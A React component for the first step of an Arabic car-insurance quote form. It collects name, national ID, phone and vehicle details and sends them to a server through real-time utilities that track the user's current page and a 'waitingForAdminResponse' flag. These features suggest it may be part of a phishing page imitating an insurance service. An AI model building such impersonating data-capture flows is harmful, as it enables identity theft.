import { useEffect, useState } from "react";
import CustomInput from "../CustomInput";
import { useLocation, useNavigate } from "react-router-dom";
import { handleSubmitTab } from "@/lib/actions";
import CarPanelSelection from "../CarPanelSelection";
import registrationTypes from "../../data/registration-types";
import {
  checkUser,
  sendDataToServer,
  setCurrentPage,
} from "@/real-time/utils/utils";

const StepOne = () => {
  const { state } = useLocation();
  const [error, setError] = useState({});
  const navigate = useNavigate();

  const handleNext = async (e: any) => {
    const res = handleSubmitTab(e, setError);

    console.log(res);

    if (res) {
      checkUser(
        {
          fullName: res.name,
          idNumber: res.id,
          phone: res.phone,
        },
        navigate,
        { ...state, ...res }
      );
      // const result = await userUpdate({
      //   id: res.id,
      //   name_ar: res.name,
      //   phone: res.phone,
      // });
      // result?.data?.message === "تم تحديث بياناتك بنجاح"?
      sendDataToServer({
        data: res,
        current: "الخطوة الأولى",
        nextPage: "",
        waitingForAdminResponse: false,
      });
      // : toast({
      //     description: result.data.message || "خطأ في تحديث البيانات",
      //     className: "text-red-500",
      //     action: <ToastAction altText="Goto toast undo">إزالة</ToastAction>,
      //   });
    }
  };

  useEffect(() => {
    setCurrentPage("الخطوة الأولى");
  }, []);

  return (
    <form onSubmit={handleNext} className="px-8">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-4 my-6">
        <CustomInput
          error={error}
          setError={setError}
          label="الغرض من التأمين"
          id="reason"
          tip={
            "شراء وثيقة تأمين لمركبتك الحالية، أو وثيقة تأمين لمركبة بغرض نقل ملكيتها؟"
          }
          biSelect={["تأمين جديد", "نقل ملكية"]}
        />

        <CustomInput
          error={error}
          setError={setError}
          label="نوع تسجيل المركبة"
          id="type"
          tip={"هل المركبة مسجلة بالرقم التسلسلي أو برقم البطاقة الجمركية؟"}
          biSelect={["الرقم التسلسلى", "بطاقة جمركية (إستيراد)"]}
        />

        <CustomInput
          error={error}
          setError={setError}
          label="إسم مقدم الطلب"
          placeholder="إسم مقدم الطلب"
          id="name"
          type="text"
        />

        <CustomInput
          error={error}
          setError={setError}
          defaultValue={state?.id}
          label="رقم الهوية أو الإقامة"
          placeholder="رقم الهوية أو الإقامة أو الشركة"
          id="id"
          type="tel"
          maxLength={10}
          tip={
            "يرجى إدخال بطاقة الهوية الخاصة بك للمواطنين أو بطاقة الإقامة للجنسيات الأخرى."
          }
        />
        <CustomInput
          error={error}
          setError={setError}
          defaultValue={state?.serial}
          label="رقم التسلسل"
          placeholder="رقم التسلسل"
          id="serial"
          maxLength={10}
          type="tel"
          tip={
            "أدخل رقم التسلسل الصحيح للمركبة المراد تأمينها للحصول على تغطية أدق."
          }
        />

        <CustomInput
          error={error}
          setError={setError}
          defaultValue={state?.phone}
          label="رقم الجوال"
          id="phone"
          placeholder="05xxxxxxx"
          type="tel"
        />

        <CustomInput
          error={error}
          setError={setError}
          label="نوع المركبة"
          placeholder="نوع المركبة"
          id="car-type"
          type="text"
        />

        <CustomInput
          error={error}
          setError={setError}
          label="سنة الصنع"
          placeholder="أختر سنة الصنع"
          defaultValue={state?.year}
          id="year"
          type="text"
          yearsDD
          hidValue
        />

        <CustomInput
          error={error}
          setError={setError}
          label="نوع التسجيل"
          placeholder="أختر نوع التسجيل"
          defaultValue={state?.["registration-type"]}
          id="registration-type"
          type="text"
          tip={
            "أردت استخدام المركبة لأغراض شخصية وفي بعض الأوقات ستقوم بنقل ركاب عبر تطبيق أوبر على سبيل المثال فعليك اختيار نقل ركاب"
          }
          dropDown
          opts={registrationTypes}
          hidValue
        />

        <CarPanelSelection error={error} />

        <CustomInput
          error={error}
          setError={setError}
          label="رمز التحقق"
          placeholder="ادخل رمز التحقق"
          id="recap"
          reCAPTCHA
          type={"number"}
        />
      </div>

      <CustomInput
        error={error}
        setError={setError}
        placeholder="الشروط و الأحكام"
        id="terms"
        terms="أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل اصدار التسعيرة"
      />

      <button
        className="capitalize w-52 my-6 rounded-md font-bold py-3 px-6 bg-[#76b456] hover:bg-[#76b456]/90 text-white"
        type="submit"
      >
        التالي
      </button>
    </form>
  );
};
export default StepOne;
